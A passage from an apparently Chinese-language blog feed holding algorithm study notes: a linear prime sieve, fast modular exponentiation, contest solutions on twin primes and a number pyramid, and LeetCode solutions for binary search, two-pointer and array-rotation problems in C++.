class="comment">//如果prim[j]刚好是i的最小质因数,所以其他时候,i不是最小质因数,prim[j]可以代替它,故退出</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>求解a^b（以2^10为例），步骤如下：</p>
<ol>
<li>a = 2，b = 10（1010b【二进制表示】）</li>
<li><code>2^10 = 2^(2^0*0 + 2^1*1 + 2^2*0 + 2^3*1</code></li>
</ol>
<p>下面的代码正是基于上面的思路：</p>
<p>若a为2，b = 10(1010b)</p>
<ol>
<li><p>初始 a = 2,b = 1010b，ans = 1；</p>
</li>
<li><p>第一次循环，因为b最低位不为1，故a = a ^ 2，ans = 1；</p>
<p>b右移，b = 101，继续循环</p>
</li>
<li><p>第二次循环，因为b = 101，最低位为1，故ans = a ^ 2，a = a^4</p>
<p>b右移，b = 10，继续循环</p>
</li>
<li><p>第三次循环，因为b = 10，最低位不为1，故ans = a^2，a = a^8</p>
<p>b右移，b = 1，继续循环</p>
</li>
<li><p>第四次循环，因为b = 1，最低位为1，故ans = a^2 * a^8 = a^10 , a=a^16</p>
<p>b继续右移，b=0，循环结束</p>
</li>
</ol>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//计算a^b</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qmod</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;<span class="comment">//首先判断b有没有</span></span><br><span class="line">        <span class="keyword">if</span>(b&amp;<span class="number">1</span>)<span class="comment">//如果b低位为1</span></span><br><span class="line">            ans = ans*a%mod;<span class="comment">//在结果中加入</span></span><br><span class="line">        a = a*a%mod;<span class="comment">//a继续</span></span><br><span class="line">        b&gt;&gt;=<span class="number">1</span>;<span class="comment">//b继续右移</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="本题求解"><a href="#本题求解" class="headerlink" title="本题求解"></a>本题求解</h3><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><ol>
<li><p>首先根据筛法求质数，将所有的质数保存在prim数组中</p>
</li>
<li><p>循环prim数组，找到所有的孪生质数，保存在a数组（向量）中</p>
</li>
<li><p>因为抽中的概率就是</p>
<script type="math/tex; mode=display">
{k} \over C{2 \atop n}</script><p>k表示的是孪生质数的对数</p>
<p>化简为</p>
<script type="math/tex; mode=display">
2*k \over n * (n-1)</script></li>
<li><p>根据vector，容易得到k</p>
</li>
<li><p>剩余1/(n*n-1)，要求mod，，，需要快速幂，然后按着公式直接计算即可得到结果</p>
</li>
</ol>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long<span class="comment">//为方便使用,将所有的int就是long long[好看又好用](注意:define后面不跟分号)</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e7</span>+<span class="number">1e3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">bool</span> ok[N];<span class="comment">//用来进行筛选的数组</span></span><br><span class="line"><span class="keyword">int</span> prim[N];<span class="comment">//存有所有的质数</span></span><br><span class="line"><span class="keyword">int</span> pos=<span class="number">0</span>;<span class="comment">//代表当前质数的个数</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span> &gt;a ;<span class="comment">//存储所有的孪生质数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; N;++i) &#123;<span class="comment">//质数是从2-N</span></span><br><span class="line">        <span class="keyword">if</span>(ok[i] == <span class="number">0</span>)&#123;<span class="comment">//0表示是质数</span></span><br><span class="line">            prim[pos++] = i;<span class="comment">//将该质数加入到prim数组中.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这里是为了将最小质因数为i的其他合数都进行标记</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; pos; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i*prim[j] &gt; N)<span class="comment">//超过范围</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ok[i*prim[j]] = <span class="number">1</span>;<span class="comment">//标记</span></span><br><span class="line">            <span class="keyword">if</span>(i%prim[j] == <span class="number">0</span>)<span class="comment">//如果prim[j]刚好是i的最小质因数,所以其他时候,i不是最小质因数,prim[j]可以代替它,故退出</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//孪生质数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pos; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(prim[i+<span class="number">1</span>] == prim[i]+<span class="number">2</span>)&#123;</span><br><span class="line">            a.push_back(prim[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算a^b</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qmod</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;</span><br><span class="line">        <span class="keyword">if</span>(b&amp;<span class="number">1</span>)</span><br><span class="line">            ans = ans*a%mod;</span><br><span class="line">        a = a*a%mod;</span><br><span class="line">        b&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;<span class="comment">//必须要返回int,但是没int了,用siged代替,本质一样</span></span><br><span class="line">    init();<span class="comment">//初始化，计算所有孪生质数</span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="keyword">int</span> sum = (upper_bound(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>(),n<span class="number">-2</span>) - a.<span class="built_in">begin</span>()) * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = sum % mod * qmod(n*(n<span class="number">-1</span>) % mod,mod<span class="number">-2</span>) % mod;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="F-数字金字塔"><a href="#F-数字金字塔" class="headerlink" title="F 数字金字塔"></a>F 数字金字塔</h2><blockquote>
<p>考试成功做出来了的简单题</p>
<p>规律很好找，主要是大数麻烦，当时用java的BigInteger做出来的，，，</p>
<p>思路巧妙地进行化简以及dp的思路</p>
</blockquote>
<h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p><img src="/2021/04/18/08-32/image-20210323164718581.png" alt="image-20210323164718581"></p>
<p>最后这步的化简是根据分数的取模得到的</p>
<p><img src="/2021/04/18/08-32/image-20210323164754408.png" alt="image-20210323164754408"></p>
<p><code>i层的和 = i-1层的和 + i*(2*i-1)</code></p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">998244353</span>;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">1e6</span>; ++i) &#123;</span><br><span class="line">        a[i] = (a[i<span class="number">-1</span>] + i*(<span class="number">2</span>*i<span class="number">-1</span>))%mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="G-小凡做蛋糕"><a href="#G-小凡做蛋糕" class="headerlink" title="G 小凡做蛋糕"></a>G 小凡做蛋糕</h2>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>西南科技大学新生赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode之算法学习计划</title>
    <url>/2021/08/26/00-03/</url>
    <content><![CDATA[<p>链接：<a href="https://leetcode-cn.com/study-plan/algorithms/?progress=x7xottv" target="_blank" rel="noopener">https://leetcode-cn.com/study-plan/algorithms/?progress=x7xottv</a></p>
<h1 id="算法入门"><a href="#算法入门" class="headerlink" title="算法入门"></a>算法入门</h1><blockquote>
<p><img src="/2021/08/26/00-03/image-20210825235602576.png" alt="image-20210825235602576"></p>
<p>2021/08/25，已完成，（´v｀），为什么感觉我更喜欢算法（而不是ctf，😔，算法好好练练，以后再重新学学网安吧。</p>
</blockquote>
<h1 id="第-1-天-二分查找"><a href="#第-1-天-二分查找" class="headerlink" title="第 1 天 二分查找"></a>第 1 天 二分查找</h1><h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search/" target="_blank" rel="noopener">704. 二分查找</a></h3><p>easy</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot,left=<span class="number">0</span>,right=nums.<span class="built_in">size</span>();<span class="comment">//设置3个变量：当前指针、左边界、右边界</span></span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;<span class="comment">//结束</span></span><br><span class="line">            pivot = left + (right-left) / <span class="number">2</span>;<span class="comment">//指针在中间的位置</span></span><br><span class="line">            <span class="keyword">if</span>(nums[pivot] == target) <span class="keyword">return</span> pivot;<span class="comment">//相等返回</span></span><br><span class="line">            <span class="keyword">if</span>(target &lt; nums[pivot]) right = pivot<span class="number">-1</span>;<span class="comment">//小于情况</span></span><br><span class="line">            <span class="keyword">else</span> left = pivot + <span class="number">1</span>;<span class="comment">//大于情况</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="278-第一个错误的版本"><a href="#278-第一个错误的版本" class="headerlink" title="278. 第一个错误的版本"></a><a href="https://leetcode-cn.com/problems/first-bad-version/" target="_blank" rel="noopener">278. 第一个错误的版本</a></h3><p>mine</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot,left=<span class="number">1</span>,right=n;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            pivot = left + (right-left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(isBadVersion(pivot)==<span class="literal">true</span> &amp;&amp; isBadVersion(pivot<span class="number">-1</span>)==<span class="literal">false</span>) <span class="keyword">return</span> pivot;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(isBadVersion(pivot)==<span class="literal">true</span>) right = pivot<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(isBadVersion(pivot)==<span class="literal">false</span>) left = pivot + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The API isBadVersion is defined for you.</span></span><br><span class="line"><span class="comment">// bool isBadVersion(int version);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">1</span>,right=n;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(isBadVersion(mid))&#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a><a href="https://leetcode-cn.com/problems/search-insert-position/" target="_blank" rel="noopener">35. 搜索插入位置</a></h3><p>mine</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot,left=<span class="number">0</span>,right=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            pivot = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(target == nums[pivot]) <span class="keyword">return</span> pivot;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(target &gt; nums[pivot]) left = pivot+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(target &lt;nums[pivot]) right = pivot<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(target &gt; nums[left])&#123;</span><br><span class="line">            <span class="keyword">return</span> left+<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer</p>
<ol>
<li>转换目标：「在一个有序数组中找第一个大于等于 target 的下标」。</li>
<li>ans初值设置为数组长度：存在一种情况是 target 大于数组中的所有数</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>,right = n<span class="number">-1</span>,ans = n;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = ((right-left) &gt;&gt; <span class="number">1</span>) + left;</span><br><span class="line">            <span class="keyword">if</span>(target &lt;= nums[mid])&#123;</span><br><span class="line">                ans = mid;</span><br><span class="line">                right = mid<span class="number">-1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-2-天-双指针"><a href="#第-2-天-双指针" class="headerlink" title="第 2 天 双指针"></a>第 2 天 双指针</h1><h3 id="977-有序数组的平方"><a href="#977-有序数组的平方" class="headerlink" title="977. 有序数组的平方"></a><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/" target="_blank" rel="noopener">977. 有序数组的平方</a></h3><p>mine</p>
<blockquote>
<p>直接排序</p>
<p>时间复杂度：O(nlog⁡n)</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            nums[i] = nums[i] * nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>双指针</strong></p>
<blockquote>
<p>由于原数组已经有序，故可以使用两个指针从0开始一个向左，一个向右，分别比较大小</p>
<p>时间复杂度：O(n)</p>
</blockquote>
<ol>
<li><p>从0向左右</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> negative = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                negative = i;<span class="comment">//negative是最右的负数</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">int</span> i = negative,j=negative+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> || j&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;<span class="comment">//左边的走完了，一直走右指针即可</span></span><br><span class="line">                ans.push_back(nums[j] * nums[j]);</span><br><span class="line">                ++j;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j == n)&#123;</span><br><span class="line">                ans.push_back(nums[i] * nums[i]);</span><br><span class="line">                --i;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[i] * nums[i] &lt; nums[j] * nums[j])&#123;</span><br><span class="line">                ans.push_back(nums[i] * nums[i]);</span><br><span class="line">                --i;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                ans.push_back(nums[j] * nums[j]);</span><br><span class="line">                ++j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>从左右向0走</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=n<span class="number">-1</span>,pos=n<span class="number">-1</span>;i&lt;=j;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] * nums[i] &gt; nums[j] * nums[j])&#123;</span><br><span class="line">                ans[pos] = nums[i] * nums[i];</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans[pos] = nums[j] * nums[j];</span><br><span class="line">                --j;</span><br><span class="line">            &#125;</span><br><span class="line">            --pos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="189-旋转数组"><a href="#189-旋转数组" class="headerlink" title="189. 旋转数组"></a><a href="https://leetcode-cn.com/problems/rotate-array/" target="_blank" rel="noopener">189. 旋转数组</a></h3><p>answer1</p>
<blockquote>
<p>由于直接放，会覆盖，所以增加一个额外数组</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">newArr</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            newArr[(i+k)%n] = nums[i];<span class="comment">//i表示第几个，+k表示右移，由于可能溢出，故取%</span></span><br><span class="line">        &#125;</span><br><span class="line">        nums.assign(newArr.<span class="built_in">begin</span>(),newArr.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer2</p>
<blockquote>
<p>数组翻转</p>
<p>原始数组<br>翻转所有元素<br>翻转[0,k mod n−1] 区间的元素<br>翻转[k mod n,n−1] 区间的元素</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> start,<span class="keyword">int</span> <span class="built_in">end</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start &lt; <span class="built_in">end</span>)&#123;</span><br><span class="line">            swap(nums[start],nums[<span class="built_in">end</span>]);</span><br><span class="line">            start++;</span><br><span class="line">            <span class="built_in">end</span>--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        k%=nums.<span class="built_in">size</span>();</span><br><span class="line">        reverse(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        reverse(nums,<span class="number">0</span>,k<span class="number">-1</span>);</span><br><span class="line">        reverse(nums,k,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer3</p>
<p><img src="/2021/08/26/00-03/image-20210730160407116.png" alt="image-20210730160407116"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        k = k%n;</span><br><span class="line">        <span class="keyword">int</span> count = gcd(k,n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> start =<span class="number">0</span>;start&lt;count;++start)&#123;<span class="comment">//往后走</span></span><br><span class="line">            <span class="keyword">int</span> current = start;</span><br><span class="line">            <span class="keyword">int</span> prev = nums[start];</span><br><span class="line">            <span class="keyword">do</span>&#123;<span class="comment">//里面是一轮</span></span><br><span class="line">                <span class="keyword">int</span> next = (current+k) %n;</span><br><span class="line">                swap(nums[next],prev);</span><br><span class="line">                current = next;</span><br><span class="line">            &#125;<span class="keyword">while</span>(start!=current);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-3-天-双指针"><a href="#第-3-天-双指针" class="headerlink" title="第 3 天 双指针"></a>第 3 天 双指针</h1><h3 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283. 移动零"></a><a href="https://leetcode-cn.com/problems/move-zeroes/" target="_blank" rel="noopener">283. 移动零</a></h3><blockquote>
<p>right指向右边的非0，left指向左边的0。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>(),left=<span class="number">0</span>,right=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[right])&#123;</span><br><span class="line">                swap(nums[left],nums[right]);</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
